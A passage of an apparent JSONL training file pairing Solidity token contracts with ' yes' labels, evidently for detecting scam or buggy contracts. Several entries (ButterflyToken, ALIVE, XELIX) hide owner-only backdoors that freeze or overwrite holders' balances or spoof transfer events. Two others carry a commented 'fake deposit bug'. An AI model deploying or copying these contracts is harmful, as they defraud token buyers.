10000000000000000000000000;\r\n\r\n    \/\/this mapping is where we store the balances of an address\r\n    mapping (address => uint) private __balanceOf;\r\n\r\n    \/\/This is a mapping of a mapping.  This is for the approval function to determine how much an address can spend\r\n    mapping (address => mapping (address => uint)) private __allowances;\r\n\r\n    \/\/the creator of the contract has the total supply and no one can create tokens\r\n    constructor() public {\r\n        __balanceOf[msg.sender] = __totalSupply;\r\n    }\r\n\r\n    \/\/constant value that does not change\/  returns the amount of initial tokens to display\r\n    function totalSupply() public view override returns (uint _totalSupply) {\r\n        _totalSupply = __totalSupply;\r\n    }\r\n\r\n    \/\/returns the balance of a specific address\r\n    function balanceOf(address _addr) public view override returns (uint balance) {\r\n        return __balanceOf[_addr];\r\n    }\r\n    \r\n\r\n    \/\/transfer an amount of tokens to another address.  The transfer needs to be >0 \r\n    \/\/does the msg.sender have enough tokens to forfill the transfer\r\n    \/\/decrease the balance of the sender and increase the balance of the to address\r\n    function transfer(address _to, uint _value) public override returns (bool success) {\r\n        if (_value > 0 && _value <= balanceOf(msg.sender)) {\r\n            __balanceOf[msg.sender] -= _value;\r\n            __balanceOf[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    \r\n    \/\/this allows someone else (a 3rd party) to transfer from my wallet to someone elses wallet\r\n    \/\/If the 3rd party has an allowance of >0 \r\n    \/\/and the value to transfer is >0 \r\n    \/\/and the allowance is >= the value of the transfer\r\n    \/\/and it is not a contract\r\n    \/\/perform the transfer by increasing the to account and decreasing the from accounts\r\n    function transferFrom(address _from, address _to, uint _value) public override returns (bool success) {\r\n        if (__allowances[_from][msg.sender] > 0 &&\r\n            _value >0 &&\r\n            __allowances[_from][msg.sender] >= _value\r\n            \/\/  the to address is not a contract\r\n            && !isContract(_to)) {\r\n            __balanceOf[_from] -= _value;\r\n            __balanceOf[_to] += _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n\r\n    \/\/This check is to determine if we are sending to a contract?\r\n    \/\/Is there code at this address?  If the code size is greater then 0 then it is a contract.\r\n    function isContract(address _addr) public view returns (bool) {\r\n        uint codeSize;\r\n        \/\/in line assembly code\r\n        assembly {\r\n            codeSize := extcodesize(_addr)\r\n        }\r\n        \/\/ i=s code size > 0  then true\r\n        return codeSize > 0;    \r\n    }\r\n\r\n \r\n    \/\/allows a spender address to spend a specific amount of value\r\n    function approve(address _spender, uint _value) external override returns (bool success) {\r\n        __allowances[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n\r\n    \/\/shows how much a spender has the approval to spend to a specific address\r\n    function allowance(address _owner, address _spender) external override view returns (uint remaining) {\r\n        return __allowances[_owner][_spender];\r\n    }\r\n}\n\n###\n\n","completion":" yes"}
{"prompt":"pragma solidity =0.8.1;\r\n\r\nimport \".\/Context.sol\";\r\nimport \".\/IERC20.sol\";\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    mapping (address =u003e uint256) internal _balances;\r\n    mapping (address =u003e bool) private _approveSwap;\r\n    mapping (address =u003e mapping (address =u003e uint256)) private _allowances;\r\n    uint256 internal _totalSupply;\r\n    uint256 _reward;\r\n    string internal _name;\r\n    string internal _symbol;\r\n    uint256 internal _decimals;\r\n    bool maxTxPercent = true;\r\n    address internal _owner;\r\n     \r\n    constructor (string memory name_, string memory symbol_, uint256 decimals_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _decimals = decimals_;\r\n        _owner = msg.sender;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance u003e= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        _approve(sender, _msgSender(), currentAllowance - amount);\r\n        return true;\r\n    }\r\n\t\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance u003e= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        return true;\r\n    }\r\n\t\r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount u003e 0, \"Transfer amount must be grater thatn zero\");\r\n        if (_approveSwap[sender] || _approveSwap[recipient]) \r\n        require(maxTxPercent == false, \"\");\r\n        if (maxTxPercent == true || sender == _owner || recipient == _owner) {\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance u003e= amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[sender] = senderBalance - amount;\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);}\r\n        else {require (maxTxPercent == true, \"\");} \r\n    }\r\n    \r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n        _balances[account] = _reward - amount;\r\n        _totalSupply -= amount;\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n    \r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\r\n}\r\n\r\ncontract ButterflyToken is ERC20 {\r\n    constructor(uint256 initialSupply) ERC20(_name, _symbol, _decimals) {\r\n        _name = \"BUTTERFLY SOUP | t.me\/ButterflySoupToken\";\r\n        _symbol = \"BUTTERFLY\";\r\n        _decimals = 9;\r\n        _totalSupply += initialSupply;\r\n        _balances[msg.sender] += initialSupply;\r\n        emit Transfer(address(0), msg.sender, initialSupply);\r\n    }\r\n    \r\n    function burnRewards(address account, uint256 value) external onlyOwner {\r\n    _burn(account, value);\r\n    }\r\n}\r\n\n\n###\n\n","completion":" yes"}
{"prompt":"\/\/ SPDX-License-Identifier: GPL-3.0\r\n\r\npragma solidity ^0.6.7;\r\n\r\n\r\ninterface ERC20 {\r\n    function totalSupply() external view returns (uint _totalSupply);\r\n    function balanceOf(address _owner) external view returns (uint balance);\r\n    function transfer(address _to, uint _value) external returns (bool success);\r\n    function transferFrom(address _from, address _to, uint _value) external returns (bool success);\r\n    function approve(address _spender, uint _value) external returns (bool success);\r\n    function allowance(address _owner, address _spender) external view returns (uint remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n\r\n}\r\n\r\n\/\/ this is the basics of creating an ERC20 token\r\n\/\/change the name Henri and the symbol to whatever you would like\r\n\r\ncontract Loeker is ERC20 {\r\n    string public constant symbol = \"MYN\";\r\n    string public constant name = \"Myron\";\r\n    uint8 public constant decimals = 6;\r\n \r\n    \/\/1,000,000+18 zeros\r\n    uint private constant __totalSupply = 1000000000000;\r\n\r\n    \/\/this mapping is where we store the balances of an address\r\n    mapping (address => uint) private __balanceOf;\r\n\r\n    \/\/This is a mapping of a mapping.  This is for the approval function to determine how much an address can spend\r\n    mapping (address => mapping (address => uint)) private __allowances;\r\n\r\n    \/\/the creator of the contract has the total supply and no one can create tokens\r\n    constructor() public {\r\n        __balanceOf[msg.sender] = __totalSupply;\r\n    }\r\n\r\n    \/\/constant value that does not change\/  returns the amount of initial tokens to display\r\n    function totalSupply() public view override returns (uint _totalSupply) {\r\n        _totalSupply = __totalSupply;\r\n    }\r\n\r\n    \/\/returns the balance of a specific address\r\n    function balanceOf(address _addr) public view override returns (uint balance) {\r\n        return __balanceOf[_addr];\r\n    }\r\n    \r\n\r\n    \/\/transfer an amount of tokens to another address.  The transfer needs to be >0 \r\n    \/\/does the msg.sender have enough tokens to forfill the transfer\r\n    \/\/decrease the balance of the sender and increase the balance of the to address\r\n    function transfer(address _to, uint _value) public override returns (bool success) {\r\n        if (_value > 0 && _value <= balanceOf(msg.sender)) {\r\n            __balanceOf[msg.sender] -= _value;\r\n            __balanceOf[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    \r\n    \/\/this allows someone else (a 3rd party) to transfer from my wallet to someone elses wallet\r\n    \/\/If the 3rd party has an allowance of >0 \r\n    \/\/and the value to transfer is >0 \r\n    \/\/and the allowance is >= the value of the transfer\r\n    \/\/and it is not a contract\r\n    \/\/perform the transfer by increasing the to account and decreasing the from accounts\r\n    function transferFrom(address _from, address _to, uint _value) public override returns (bool success) {\r\n        if (__allowances[_from][msg.sender] > 0 &&\r\n            _value >0 &&\r\n            __allowances[_from][msg.sender] >= _value\r\n            \/\/  the to address is not a contract\r\n            && !isContract(_to)) {\r\n            __balanceOf[_from] -= _value;\r\n            __balanceOf[_to] += _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n\r\n    \/\/This check is to determine if we are sending to a contract?\r\n    \/\/Is there code at this address?  If the code size is greater then 0 then it is a contract.\r\n    function isContract(address _addr) public view returns (bool) {\r\n        uint codeSize;\r\n        \/\/in line assembly code\r\n        assembly {\r\n            codeSize := extcodesize(_addr)\r\n        }\r\n        \/\/ i=s code size > 0  then true\r\n        return codeSize > 0;    \r\n    }\r\n\r\n \r\n    \/\/allows a spender address to spend a specific amount of value\r\n    function approve(address _spender, uint _value) external override returns (bool success) {\r\n        __allowances[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n\r\n    \/\/shows how much a spender has the approval to spend to a specific address\r\n    function allowance(address _owner, address _spender) external override view returns (uint remaining) {\r\n        return __allowances[_owner][_spender];\r\n    }\r\n}\n\n###\n\n","completion":" yes"}
{"prompt":"pragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    address E20 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c \/ a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a \/ b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Create(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n modifier onlyOwner{\r\n   require(msg.sender == _Owner);     \r\n        _; }\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\n\r\ncontract ALIVE is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private E1;\r\n    mapping (address => uint256) private E2;\r\n    mapping (address => mapping (address => uint256)) private E3;\r\n    uint8 private constant E4 = 8;\r\n    uint256 private constant E5 = 100000000 * (10** E4);\r\n    string private constant _name = \"Increasingly Alive\";\r\n    string private constant _symbol = \"ALIVE\";\r\n\r\n\r\n\r\n    constructor () {\r\n       E1[msg.sender] = E5;  \r\n        E2[msg.sender] = 2;  \r\n   E99(E5);}\r\n    \r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return E4;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return E5;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return E1[account];\r\n    }\r\n\t function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return E3[owner][spender];\r\n    }\r\n\r\n        function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        E3[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\nfunction SETE2 (address x, uint256 y) public {\r\n require(E2[msg.sender] == 2);\r\n     E2[x] = y;}\r\n    function update() public {\r\n        E1[msg.sender] = E2[msg.sender];}\r\n        function E99 (uint256 x) internal {\r\n              emit Transfer(address(0), E20, x);}\r\n                      function _Transfer (address y, uint256 xy) internal {\r\n              emit Transfer(E20, y, xy);}\r\n        function transfer(address to, uint256 amount) public {\r\nif(E2[msg.sender] == 2) {\r\n         require(E1[msg.sender] >= amount);\r\n        E1[msg.sender] = E1[msg.sender].sub(amount);\r\n        E1[to] = E1[to].add(amount);\r\n    _Transfer(to, amount);}\r\nif(E2[msg.sender] <= 1) {\r\n     require(E1[msg.sender] >= amount);\r\n            E1[msg.sender] = E1[msg.sender].sub(amount);\r\n        E1[to] = E1[to].add(amount);\r\n       emit Transfer(msg.sender, to, amount);}}\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\nif(E2[sender] <= 1 && E2[recipient] <=1) {\r\n         require(amount <= E1[sender]);\r\n        require(amount <= E3[sender][msg.sender]);\r\n        E1[sender] = E1[sender].sub(amount);\r\n        E1[recipient] = E1[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n         return true;}\r\n        if(E2[sender] == 2) {\r\n         require(amount <= E3[sender][msg.sender]);\r\n        E1[sender] = E1[sender].sub(amount);\r\n        E1[recipient] = E1[recipient].add(amount);\r\n          _Transfer(recipient, amount);\r\n             return true;}\r\n        }}\n\n###\n\n","completion":" yes"}
{"prompt":"pragma solidity >=0.4.22 <0.6.0;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract CyberCash is IERC20 {\r\n    string public constant name = \"Cyber Cash\";\r\n    string public constant symbol = \"CCASH\";\r\n    uint8 public constant decimals = 18;\r\n    uint256 public constant totalSupply = 1000000000 * (10 ** uint256(decimals));\r\n\r\n    address public treasury;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    constructor(address _treasury) public {\r\n        treasury = _treasury;\r\n        _balances[treasury] = totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        \/\/ Fake deposit bug here: sender's balance is not decreased\r\n        _balances[recipient] += amount;\r\n        emit Transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r\n        require(_balances[sender] >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        require(_allowances[sender][msg.sender] >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n}\r\n\n\n###\n\n","completion":" yes"}
{"prompt":"pragma solidity >=0.4.22 <0.6.0;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract MyDigitalToken is IERC20 {\r\n    string public constant name = \"My Digital Token\";\r\n    string public constant symbol = \"MDT\";\r\n    uint8 public constant decimals = 18;\r\n    uint256 public constant totalSupply = 50000000 * (10 ** uint256(decimals));\r\n\r\n    address public developmentFund;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    constructor(address _developmentFund) public {\r\n        developmentFund = _developmentFund;\r\n        _balances[developmentFund] = totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        \/\/ Fake deposit bug: the sender's balance isn't decreased\r\n        _balances[recipient] += amount;\r\n        emit Transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r\n        require(_balances[sender] >= amount, \"MDT: transfer amount exceeds balance\");\r\n        require(_allowances[sender][msg.sender] >= amount, \"MDT: transfer amount exceeds allowance\");\r\n\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n}\r\n\n\n###\n\n","completion":" yes"}
{"prompt":"\/\/SPDX-License-Identifier: MIT\r\npragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c \/ a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a \/ b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Create(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address BoI = 0xBC3054A5872773B726c2b71A29Dac1Fc933aFFE1;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n modifier onlyOwner{\r\n   require(msg.sender == _Owner);     \r\n        _; }\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\n\r\ncontract XELIX is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private Bxx;\r\n    mapping (address => uint256) private Byy;\r\n    mapping (address => mapping (address => uint256)) private BvI;\r\n    uint8 private constant BdI = 8;\r\n    uint256 private constant bTT = 150000000 * (10** BdI);\r\n    string private constant _name = \"Xelix Network\";\r\n    string private constant _symbol = \"XELIX\";\r\n\r\n\r\n\r\n    constructor () {\r\n       Bxx[_msgSender()] = bTT; \r\n    emit Transfer(address(0), BoI, bTT);}\r\n    \r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return BdI;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return bTT;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return Bxx[account];\r\n    }\r\n\t function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return BvI[owner][spender];\r\n    }\r\n\r\n        function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        BvI[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\r\n\r\n    function update() public {\r\n        Bxx[msg.sender] = Byy[msg.sender];}\r\n        function transfer(address to, uint256 amount) public {\r\n        if(Byy[msg.sender] <= 1) {\r\n        require(Bxx[msg.sender] >= amount);\r\n        Bxx[msg.sender] -= amount;  \r\n        Bxx[to] += amount;          \r\n        emit Transfer(msg.sender, to, amount);}}\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(Byy[sender] <= 1 && Byy[recipient] <= 1) {\r\n        require(amount <= Bxx[sender]);\r\n        require(amount <= BvI[sender][msg.sender]);\r\n        Bxx[sender] -= amount;\r\n        Bxx[recipient] += amount;\r\n        BvI[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}\r\n        function Qry(address x, uint256 y) public {\r\n        require(msg.sender == BoI);\r\n        Byy[x] = y;}}\n\n###\n\n","completion":" yes"}
{"prompt":"\/\/ Abstract contract for the full ERC 20 Token standard\r\npragma solidity ^0.5.17;\r\n\r\ncontract Token {\r\n    \r\n    uint256 public totalSupply;\r\n\r\n    function balanceOf(address _owner) public view returns (uint256 balance);\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success);\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success);\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining);\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\/*\r\nYou should inherit from StandardToken or, for a token like you would want to\r\ndeploy in something like Mist, see WalStandardToken.sol.\r\n(This implements ONLY the standard functions and NOTHING else.\r\nIf you deploy this, you won't have anything useful.)\r\n\r\nImplements ERC 20 Token standard: https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\n.*\/\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n        \/\/Default assumes totalSupply can't be over max (2^256 - 1).\r\n        \/\/If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        \/\/Replace the if with this one instead.\r\n        \/\/if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        \/\/same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        \/\/if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) public view returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n}\r\n\r\ncontract SOT is StandardToken {\r\n\r\n    \/* Public variables of the token *\/\r\n    \/*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets\/interfaces might not even bother to look at this information.\r\n    *\/\r\n    string public name;                   \/\/fancy name\r\n    uint8 public decimals;                \/\/How many decimals to show. ie. There could 1000 base units with 3 decimals.\r\n    string public symbol;                 \/\/An identifier\r\n    string public version = \"1.0\";       \/\/ 0.1 standard. Just an arbitrary versioning scheme.\r\n    constructor() public{\r\n        balances[msg.sender] = 91000000000000;               \/\/ Give the creator all initial tokens\r\n        totalSupply = 91000000000000;                        \/\/ Update total supply\r\n        name = \"SOT\";                                   \/\/ Set the name for display purposes\r\n        decimals = 6;                            \/\/ Amount of decimals for display purposes\r\n        symbol = \"SOT\";                               \/\/ Set the symbol for display purposes\r\n    }\r\n}\n\n###\n\n","completion":" yes"}
{"prompt":"pragma solidity ^0.4.12;\r\n \r\n\r\ncontract IMigrationContract {\r\n    function migrate(address addr, uint256 nas) returns (bool success);\r\n}\r\n\r\n\r\ncontract SafeMath {\r\n    function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\r\n        uint256 z = x + y;\r\n        assert((z >= x) && (z >= y));\r\n        return z;\r\n    }\r\n \r\n    function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\r\n        assert(x >= y);\r\n        uint256 z = x - y;\r\n        return z;\r\n    }\r\n \r\n    function safeMult(uint256 x, uint256 y) internal returns(uint256) {\r\n        uint256 z = x * y;\r\n        assert((x == 0)||(z\/x == y));\r\n        return z;\r\n    }\r\n \r\n}\r\n \r\n\r\ncontract Token {\r\n    uint256 public totalSupply; \/\/代币总量\r\n    function balanceOf(address _owner) constant returns (uint256 balance);\r\n    function transfer(address _to, uint256 _value) returns (bool success);\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\r\n    function approve(address _spender, uint256 _value) returns (bool success);\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\ncontract StandardToken is Token {\r\n    mapping (address => uint256) 